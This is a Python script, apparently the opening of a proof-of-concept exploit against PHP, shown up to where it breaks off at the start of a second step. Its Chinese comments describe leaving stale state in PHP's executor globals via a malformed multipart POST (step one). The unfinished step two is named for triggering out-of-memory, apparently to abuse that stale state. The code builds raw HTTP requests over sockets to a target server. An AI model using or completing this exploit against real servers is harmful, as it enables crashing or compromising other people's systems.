import argparse
import socket
import sys
from urllib.parse import urlparse


def send_request(host, port, data, timeout=30):
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(data)
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
        except ConnectionResetError:
            break
    s.close()
    return resp


def step1_populate_stale_state(host, port, path):
    """
    Request 1: 让 EG() 里带上一份可用的状态。
    任何会产生 warning / notice / exception / serialize 状态的请求都行。
    这里用畸形 multipart 触发 PHP 解析告警。
    """
    body = b"invalid multipart data that PHP will try to parse"
    req = (
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: multipart/form-data; boundary=INVALID\r\n"
        "Content-Length: %d\r\n"
        "Connection: keep-alive\r\n"
        "\r\n" % (path, host, len(body))
    ).encode() + body
    return send_request(host, port, req)


def step2_trigger_oom(host, port, path, memory_limit_mb=128):
